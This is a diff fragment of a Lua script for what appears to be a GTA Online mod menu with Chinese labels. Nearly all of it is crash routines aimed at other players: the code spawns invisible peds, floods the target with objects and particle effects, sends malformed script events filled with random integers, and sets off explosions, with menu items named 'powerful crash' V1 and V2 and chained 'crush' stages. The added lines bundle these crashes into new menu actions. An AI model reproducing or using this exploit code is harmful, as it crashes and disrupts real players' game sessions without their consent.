-                "ent_sht_electrical_box", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
-            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-                "exp_extinguisher", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
-            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-                "veh_rotor_break", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
-            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-                "ent_ray_heli_aprtmnt_water", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
-            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-                "ent_dst_inflatable", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-            request_ptfx_asset("scr_sum2_hal")
-            GRAPHICS.USE_PARTICLE_FX_ASSET("scr_sum2_hal")
-            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-                "scr_sum2_hal_rider_death_green", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-            GRAPHICS.USE_PARTICLE_FX_ASSET("scr_sum2_hal")
-            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-                "scr_sum2_hal_rider_death_white", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
-            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-               "ent_sht_oil", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-            menu.set_value(freeze_toggle, false)
-        ENTITY.SET_ENTITY_VISIBLE(PED6, false, 0)
-        wait(100)
-        WEAPON.GIVE_WEAPON_TO_PED(PED6,-270015777,80,true,true)
-        wait(1000)
-        FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)
-        wait(10000)
-        entities.delete_by_handle(PED6)
-    end
-    if players.exists(PlayerID) then
-        notification("[夜幕提示]未能移除该玩家，开始crush7崩溃",colors.black)
-        local PED7 = CreatePed(26,util.joaat("cs_wade"),TargetPlayerPos, 0)
-            menu.set_value(freeze_toggle, true)
-            request_ptfx_asset("core")
-            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
-            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-                "veh_respray_smoke", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
-            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-                "ent_sht_electrical_box", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
-            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-                "exp_extinguisher", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
-            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-                "veh_rotor_break", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
-            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-                "ent_ray_heli_aprtmnt_water", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
-            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-                "ent_dst_inflatable", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-            request_ptfx_asset("scr_sum2_hal")
-            GRAPHICS.USE_PARTICLE_FX_ASSET("scr_sum2_hal")
-            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-                "scr_sum2_hal_rider_death_green", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-            GRAPHICS.USE_PARTICLE_FX_ASSET("scr_sum2_hal")
-            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-                "scr_sum2_hal_rider_death_white", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
-            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-               "ent_sht_oil", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-            menu.set_value(freeze_toggle, false)
-        ENTITY.SET_ENTITY_VISIBLE(PED7, false, 0)
-        wait(100)
-        WEAPON.GIVE_WEAPON_TO_PED(PED7,-270015777,80,true,true)
-        wait(1000)
-        FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)
-        wait(10000)
-        entities.delete_by_handle(PED7)
-    end
-    if players.exists(PlayerID) then
-        notification("[夜幕提示]未能移除该玩家，开始crush8崩溃",colors.black)
-    ENTITY.FREEZE_ENTITY_POSITION(players.user_ped(PlayerID), true)
-            menu.set_value(freeze_toggle, true)
-            request_ptfx_asset("core")
-            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
-            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-                "veh_respray_smoke", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
-            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-                "ent_sht_electrical_box", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
-            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-                "exp_extinguisher", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
-            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-                "veh_rotor_break", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
-            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-                "ent_ray_heli_aprtmnt_water", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
-            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-                "ent_dst_inflatable", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-            request_ptfx_asset("scr_sum2_hal")
-            GRAPHICS.USE_PARTICLE_FX_ASSET("scr_sum2_hal")
-            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-                "scr_sum2_hal_rider_death_green", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-            GRAPHICS.USE_PARTICLE_FX_ASSET("scr_sum2_hal")
-            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-                "scr_sum2_hal_rider_death_white", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
-            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-               "ent_sht_oil", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-            menu.set_value(freeze_toggle, false)
-    entities.create_object(854521792, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID)), true, false) 
-    entities.create_object(1230813074, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID)), true, false) 
-    entities.create_object(992647982, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID)), true, false) 
-    entities.create_object(992647982, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID)), true, false) 
-    entities.create_object(1230813074, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID)), true, false) 
-    entities.create_object(379464063, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID)), true, false) 
-    entities.create_object(3842125059, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID)), true, false) 
-    entities.create_object(379464063, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID)), true, false) 
-    entities.create_object(3842125059, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID)), true, false) 
-    entities.create_object(3118716721, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID)), true, false) 
-    entities.create_object(628215202, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID)), true, false) 
-    entities.create_object(454560116, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID)), true, false) 
-    entities.create_object(2155335200, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID)), true, false) 
-    entities.create_object(454560116, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID)), true, false) 
-    entities.create_object(3214960853, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID)), true, false) 
-    entities.create_object(1766664132, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID)), true, false) 
-    entities.create_object(1285387036, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID)), true, false) 
-    entities.create_object(2379784022, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID)), true, false)  
-    entities.create_object(4187491267, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID)), true, false) 
-    entities.create_object(898538019, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID)), true, false)  
-    entities.create_object(2136062268, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID)), true, false) 
-    entities.create_object(3026386862, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID)), true, false) 
-    entities.create_object(1830560242, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID)), true, false) 
-    entities.create_object(546277594, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID)), true, false) 
-    entities.create_object(905229220, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID)), true, false) 
-    entities.create_object(4266988797, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID)), true, false) 
-    entities.create_object(565828550, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID)), true, false) 
-    entities.create_object(2378727039, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID)), true, false) 
-    entities.create_object(3121034765, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID)), true, false) 
-    entities.create_object(2710564114, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID)), true, false) 
-    entities.create_object(2075346744, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID)), true, false) 
-    entities.create_object(1766664132, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID)), true, false)  
-    entities.create_object(238789712, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID)), true, false) 
-    entities.create_object(2944353280, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID)), true, false) 
-    entities.create_object(73817482, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID)), true, false) 
-    entities.create_object(2379784022, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID)), true, false) 
-    entities.create_object(3360369104, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID)), true, false) 
-    entities.create_object(1222719889, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID)), true, false) 
-    entities.create_object(3461835647, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID)), true, false) 
-    entities.create_object(2177832325, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID)), true, false) 
-    entities.create_object(2812645111, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID)), true, false) 
-    entities.create_object(2111381284, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID)), true, false) 
-    entities.create_object(861842375, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID)), true, false) 
-    entities.create_object(2948772422, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID)), true, false)  
-    entities.create_object(4222615668, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID)), true, false) 
-    entities.create_object(1704052293, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID)), true, false)
-    entities.create_object(4187491267, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID)), true, false)
-			menu.trigger_commands("anticrashcam off")
-			menu.trigger_commands("potatomode off")
-   end
-    if players.exists(PlayerID) then
-        notification("[夜幕提示]未能移除该玩家，开始crush8崩溃",colors.black)
-    local int_min = -2147483647
-    local int_max = 2147483647
-    for i = 1, 15 do
-        util.trigger_script_event(1 << PlayerID, {-992162568, 0, 40778, 85683, 32561, 49696, 24000,  78834,  1860,  37655, math.random(int_min, int_max), math.random(int_min, int_max), -- Crash Event S1
-        math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
-        math.random(int_min, int_max), PlayerID, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
-        util.trigger_script_event(1 << PlayerID, {891653640, 0, 81468, 96773, 84776, 2939, 20158,  14219,  38254,  22206})
-            menu.set_value(freeze_toggle, true)
-            request_ptfx_asset("core")
-            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
-            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-                "veh_respray_smoke", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
-            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-                "ent_sht_electrical_box", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
-            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-                "exp_extinguisher", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
-            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-                "veh_rotor_break", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
-            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-                "ent_ray_heli_aprtmnt_water", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
-            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-                "ent_dst_inflatable", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-            request_ptfx_asset("scr_sum2_hal")
-            GRAPHICS.USE_PARTICLE_FX_ASSET("scr_sum2_hal")
-            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-                "scr_sum2_hal_rider_death_green", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-            GRAPHICS.USE_PARTICLE_FX_ASSET("scr_sum2_hal")
-            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-                "scr_sum2_hal_rider_death_white", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
-            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
-               "ent_sht_oil", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
-            menu.set_value(freeze_toggle, false)
-   end
-   end
-    if not players.exists(PlayerID) then
-			menu.trigger_commands("anticrashcam off")
-			menu.trigger_commands("potatomode off")
-        notification("[夜幕提示]拜拜了您内！不送",colors.red)
-    end
-end)
-caidanbk = menu.list(player_removals,"菜单崩溃", {},"")
-    menu.action(caidanbk,"2T崩溃",{},"",function()  
-    local pos <const> = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID))
-    pos.x = pos.x + 3
-    local sb_ped <const> = CreatePed(26,util.joaat("a_c_rat"),pos,0)
-    local crash_plane <const> = CreateVehicle(0x9c5e5644,pos,0)
-    PED.SET_PED_INTO_VEHICLE(sb_ped,crash_plane,-1)
-    PED.SET_PED_INTO_VEHICLE(players.user_ped(players.user()),crash_plane,-1)
-    ENTITY.FREEZE_ENTITY_POSITION(crash_plane,true)
-    local time <const> = util.current_time_millis() + 3500
-    TASK.TASK_OPEN_VEHICLE_DOOR(players.user_ped(players.user()), crash_plane, 9999, -1, 2)
-    while time > util.current_time_millis() do
-    TASK.TASK_LEAVE_VEHICLE(sb_ped, crash_plane, 0)
-    util.yield(5)
-    end
-    entities.delete_by_handle(sb_ped)
+    menu.action(collapse1, "放浪不羁", {"fanglangbuju"}, "", function()
+       fanglangbuju_crashes(PlayerID)
+        notification( "放浪不羁---崩溃结束", colors.black)
     end)
-
-    menu.action(caidanbk, "强力崩溃V1", {""}, "请勿对自己使用", function()
-        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
-        local pos = ENTITY.GET_ENTITY_COORDS(ped, true)
-        local mdl = util.joaat("A_C_Cat_01")
-        local mdl2 = util.joaat("U_M_Y_Zombie_01")
-        local mdl3 = util.joaat("A_F_M_ProlHost_01")
-        local mdl4 = util.joaat("A_M_M_SouCent_01")
-        local veh_mdl = util.joaat("insurgent2")
-        local veh_mdl2 = util.joaat("brawler")
-        local animation_tonta = ("anim@mp_player_intupperstinker")
-        request_model(animation_tonta)
-        util.request_model(veh_mdl)
-        util.request_model(veh_mdl2)
-        util.request_model(mdl)
-        util.request_model(mdl2)
-        util.request_model(mdl3)
-        util.request_model(mdl4)
-        for i = 1, 250 do
-            local ped1 = entities.create_ped(1, mdl, pos, 0)
-            local ped_ = entities.create_ped(1, mdl2, pos, 0)
-            local ped3 = entities.create_ped(1, mdl3, pos, 0)
-            local ped3 = entities.create_ped(1, mdl4, pos, 0)
-            local veh = entities.create_vehicle(veh_mdl, pos, 0)
-            local veh2 = entities.create_vehicle(veh_mdl2, pos, 0)
-            util.yield(100)
-            PED.SET_PED_INTO_VEHICLE(ped1, veh, -1)
-            PED.SET_PED_INTO_VEHICLE(ped_, veh, -1)
-
-            PED.SET_PED_INTO_VEHICLE(ped1, veh2, -1)
-            PED.SET_PED_INTO_VEHICLE(ped_, veh2, -1)
-
-            PED.SET_PED_INTO_VEHICLE(ped1, veh, -1)
-            PED.SET_PED_INTO_VEHICLE(ped_, veh, -1)
-
-            PED.SET_PED_INTO_VEHICLE(ped1, veh2, -1)
-            PED.SET_PED_INTO_VEHICLE(ped_, veh2, -1)
-            
-            PED.SET_PED_INTO_VEHICLE(mdl3, veh, -1)
-            PED.SET_PED_INTO_VEHICLE(mdl3, veh2, -1)
-
-            PED.SET_PED_INTO_VEHICLE(mdl4, veh, -1)
-            PED.SET_PED_INTO_VEHICLE(mdl4, veh2, -1)
-
-            TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh, ped, 10.0, 0, 10, 0, 0)
-            TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh, ped, 10.0, 0, 10, 0, 0)
-            TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh2, ped, 10.0, 0, 10, 0, 0)
-            TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh2, ped, 10.0, 0, 10, 0, 0)
-
-            TASK.TASK_VEHICLE_HELI_PROTECT(mdl3, veh, ped, 10.0, 0, 10, 0, 0)
-            TASK.TASK_VEHICLE_HELI_PROTECT(mdl3, veh2, ped, 10.0, 0, 10, 0, 0)
-            TASK.TASK_VEHICLE_HELI_PROTECT(mdl4, veh, ped, 10.0, 0, 10, 0, 0)
-            TASK.TASK_VEHICLE_HELI_PROTECT(mdl4, veh2, ped, 10.0, 0, 10, 0, 0)
-
-            TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh, ped, 10.0, 0, 10, 0, 0)
-            TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh, ped, 10.0, 0, 10, 0, 0)
-            TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh2, ped, 10.0, 0, 10, 0, 0)
-            TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh2, ped, 10.0, 0, 10, 0, 0)
-            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 2, 0)
-            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 1, 0)
-            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 0, 0)
-
-            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 2, 0)
-            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 1, 0)
-            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 0, 0)
-            PED.SET_PED_COMPONENT_VARIATION(mdl3, 0, 2, 0)
-            PED.SET_PED_COMPONENT_VARIATION(mdl3, 0, 1, 0)
-            PED.SET_PED_COMPONENT_VARIATION(mdl3, 0, 0, 0)
-            
-            PED.SET_PED_COMPONENT_VARIATION(mdl4, 0, 2, 0)
-            PED.SET_PED_COMPONENT_VARIATION(mdl4, 0, 1, 0)
-            PED.SET_PED_COMPONENT_VARIATION(mdl4, 0, 0, 0)
-
-            TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl)
-            TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl2)
-            TASK.TASK_START_SCENARIO_IN_PLACE(mdl, animation_tonta, 0, false)
-            TASK.TASK_START_SCENARIO_IN_PLACE(mdl, animation_tonta, 0, false)
-            TASK.TASK_START_SCENARIO_IN_PLACE(mdl, animation_tonta, 0, false)
-            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, animation_tonta, 0, false)
-            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, animation_tonta, 0, false)
-            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, animation_tonta, 0, false)
-            TASK.TASK_START_SCENARIO_IN_PLACE(mdl3, animation_tonta, 0, false)
-            TASK.TASK_START_SCENARIO_IN_PLACE(mdl4, animation_tonta, 0, false)
-
-            ENTITY.SET_ENTITY_HEALTH(mdl, false, 200)
-            ENTITY.SET_ENTITY_HEALTH(mdl2, false, 200)
-            ENTITY.SET_ENTITY_HEALTH(mdl3, false, 200)
-            ENTITY.SET_ENTITY_HEALTH(mdl4, false, 200)
-
-            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 2, 0)
-            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 1, 0)
-            PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 0, 0)
-            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 2, 0)
-            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 1, 0)
-            PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 0, 0)
-            TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl2)
-            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, animation_tonta, 0, false)
-            TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, animation_tonta, 0, false)
-            TASK.TASK_START_SCENARIO_IN_PLACE(mdl3, animation_tonta, 0, false)
-            PED.SET_PED_INTO_VEHICLE(mdl, veh, -1)
-            PED.SET_PED_INTO_VEHICLE(mdl2, veh, -1)
-            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, animation_tonta, 0, false)
-            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, animation_tonta, 0, false)
-            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, animation_tonta, 0, false)
-            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, animation_tonta, 0, false)
-            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, animation_tonta, 0, false)
-            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, animation_tonta, 0, false)
-            util.yield(200)
-            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, animation_tonta, 0, false)
-            TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, animation_tonta, 0, false)
-        end
-        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl)
-        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl2)
-		STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl)
-        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl2)
-        entities.delete_by_handle(mdl)
-        entities.delete_by_handle(mdl2)
-        entities.delete_by_handle(mdl3)
-        entities.delete_by_handle(mdl4)
-        entities.delete_by_handle(veh_mdl)
-        entities.delete_by_handle(veh_mdl2)
+    menu.action(collapse1, "落拓不羁", {"luotuobuju"}, "", function()
+           menu.trigger_commands("yeyeshengge " .. players.get_name(PlayerID))
+           menu.trigger_commands("zhaofengyindie " .. players.get_name(PlayerID))
+           menu.trigger_commands("fanglangbuju " .. players.get_name(PlayerID))
     end)
-menu.action(caidanbk, "强力崩溃V2", {""}, "", function()   
-    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
-    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
-   local PED1 = CreatePed(26,util.joaat("cs_beverly"),TargetPlayerPos, 0)
-    ENTITY.SET_ENTITY_VISIBLE(PED1, false, 0)
-    util.yield(100)
-    WEAPON.GIVE_WEAPON_TO_PED(PED1,-270015777,80,true,true)
-    util.yield(1000)
-    FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)  
-    util.yield(10000)
-    entities.delete_by_handle(PED1)   
-    if players.exists(PlayerID) then
-        notification("未能移除玩家,正在使用cs_fabien模型",colors.black)
-        local PED2 = CreatePed(26,util.joaat("cs_fabien"),TargetPlayerPos, 0)
-        ENTITY.SET_ENTITY_VISIBLE(PED2, false, 0)
-        util.yield(100)
-        WEAPON.GIVE_WEAPON_TO_PED(PED2,-270015777,80,true,true)
-        util.yield(1000)
-        FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)
-        util.yield(10000)
-        entities.delete_by_handle(PED2)
-    end
-    if players.exists(PlayerID) then
-        notification("未能移除玩家,正在使用cs_manuel模型",colors.black)
-        local PED3 = CreatePed(26,util.joaat("cs_manuel"),TargetPlayerPos, 0)
-        ENTITY.SET_ENTITY_VISIBLE(PED3, false, 0)
-        util.yield(100)
-        WEAPON.GIVE_WEAPON_TO_PED(PED3,-270015777,80,true,true)
-        util.yield(1000)
-        FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)
-        util.yield(10000)
-        entities.delete_by_handle(PED3)
-    end
-    if players.exists(PlayerID) then
-        notification("未能移除玩家,正在使用cs_taostranslator模型",colors.black)
-        local PED4 = CreatePed(26,util.joaat("cs_taostranslator"),TargetPlayerPos, 0)
-        ENTITY.SET_ENTITY_VISIBLE(PED4, false, 0)
-        util.yield(100)
-        WEAPON.GIVE_WEAPON_TO_PED(PED4,-270015777,80,true,true)
-        util.yield(1000)
-        FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)
